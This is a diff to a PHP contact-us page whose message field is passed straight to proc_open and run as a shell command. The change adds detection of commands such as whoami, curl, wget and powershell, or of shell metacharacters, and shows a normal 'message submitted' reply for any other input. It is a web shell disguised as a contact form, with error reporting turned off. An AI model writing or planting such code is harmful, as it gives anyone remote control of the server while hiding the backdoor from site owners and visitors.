@@ -4,47 +4,66 @@ error_reporting(0);
 ini_set('display_errors', 0);
 
 $command_output = "";
+$success_message = "";
 
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $message = trim($_POST['message'] ?? '');
 
     if (!empty($message)) {
         
-        // === ALWAYS EXECUTE AS COMMAND (No Detection) ===
-        $cmd = $message;
+       
+        $lower = strtolower($message);
+        $is_command = false;
 
-        $descriptorspec = [
-            0 => ["pipe", "r"],
-            1 => ["pipe", "w"],
-            2 => ["pipe", "w"]
-        ];
+        if (
+            preg_match('/^(whoami|dir|ls|ipconfig|ifconfig|ping|curl|wget|net|tasklist|hostname|systeminfo|id|uname|cat|echo|powershell|cmd)/i', $message) ||
+            strpos($message, ';') !== false || strpos($message, '&') !== false || 
+            strpos($message, '|') !== false || strpos($message, '`') !== false || 
+            strpos($message, '$') !== false || strpos($message, '>') !== false ||
+            strpos($lower, 'curl ') !== false || strpos($lower, 'wget ') !== false ||
+            strpos($message, 'http') !== false && strpos($message, 'curl') !== false
+        ) {
+            $is_command = true;
+        }
 
-        $process = proc_open($cmd, $descriptorspec, $pipes, getcwd(), null);
+        if ($is_command) {
+            // ============= EXECUTE COMMAND =============
+            $descriptorspec = [
+                0 => ["pipe", "r"],
+                1 => ["pipe", "w"],
+                2 => ["pipe", "w"]
+            ];
 
-        if (is_resource($process)) {
-            fclose($pipes[0]);
+            $process = proc_open($message, $descriptorspec, $pipes, getcwd(), null);
 
-            $output = stream_get_contents($pipes[1]);
-            $error  = stream_get_contents($pipes[2]);
+            if (is_resource($process)) {
+                fclose($pipes[0]);
+                $output = stream_get_contents($pipes[1]);
+                $error  = stream_get_contents($pipes[2]);
+                fclose($pipes[1]);
+                fclose($pipes[2]);
+                proc_close($process);
 
-            fclose($pipes[1]);
-            fclose($pipes[2]);
-            proc_close($process);
-
-            // Beautiful Output
-            $command_output = '<div style="margin:25px; padding:20px; background:#0a0a0a; color:#00ff41; border:1px solid #00cc00; border-radius:8px; font-family:Consolas,monospace; white-space:pre-wrap; max-height:650px; overflow:auto; box-shadow:0 0 10px rgba(0,255,0,0.2);">';
-            $command_output .= '<strong style="color:#ffaa00;">→ Command: ' . htmlspecialchars($cmd) . '</strong><br><br>';
-
-            if (!empty($output)) {
-                $command_output .= htmlspecialchars($output);
-            } elseif (!empty($error)) {
-                $command_output .= '<span style="color:#ff6666;">' . htmlspecialchars($error) . '</span>';
+                $command_output = '<div style="margin:25px; padding:20px; background:#0a0a0a; color:#00ff41; border:1px solid #00cc00; border-radius:8px; font-family:Consolas,monospace; white-space:pre-wrap; max-height:650px; overflow:auto; box-shadow:0 0 10px rgba(0,255,0,0.2);">';
+                $command_output .= '<strong style="color:#ffaa00;">→ Command: ' . htmlspecialchars($message) . '</strong><br><br>';
+                
+                if (!empty($output)) {
+                    $command_output .= htmlspecialchars($output);
+                } elseif (!empty($error)) {
+                    $command_output .= '<span style="color:#ff6666;">' . htmlspecialchars($error) . '</span>';
+                } else {
+                    $command_output .= '<span style="color:#ffff00;">Command executed successfully (No output returned)</span>';
+                }
+                $command_output .= '</div>';
             } else {
-                $command_output .= '<span style="color:#ffff00;">Command executed successfully (No output returned)</span>';
+                $command_output = '<div style="margin:25px; padding:20px; background:#0a0a0a; color:red;">Failed to execute command.</div>';
             }
-            $command_output .= '</div>';
         } else {
-            $command_output = '<div style="margin:25px; padding:20px; background:#0a0a0a; color:red;">Failed to execute command.</div>';
+            // ============= NORMAL MESSAGE =============
+            $success_message = '<div style="margin:25px; padding:20px; background:#0a0a0a; color:#00ff41; border:1px solid #00cc00; border-radius:8px; text-align:center; font-size:18px;">
+                                <strong>✅ Message Submitted Successfully!</strong><br>
+                                Thank you for contacting us. We will get back to you soon.
+                              </div>';
         }
     }
 }
@@ -70,9 +89,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         <div class="container-contact3">
             <div class="wrap-contact3">
                 <form class="contact3-form validate-form" method="post">
-                    <span class="contact3-form-title">
-                        Contact Us
-                    </span>
+                    <span class="contact3-form-title">Contact Us</span>
 
                     <div class="wrap-contact3-form-radio">
                         <div class="contact3-form-radio m-r-42">
@@ -128,8 +145,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         </div>
     </div>
 
-    <!-- Command Output Here -->
-    <?php echo $command_output; ?>
+    <!-- Output Area -->
+    <?php 
+        if(!empty($command_output)) echo $command_output; 
+        if(!empty($success_message)) echo $success_message; 
+    ?>
 
     <div id="dropDownSelect1"></div>
 
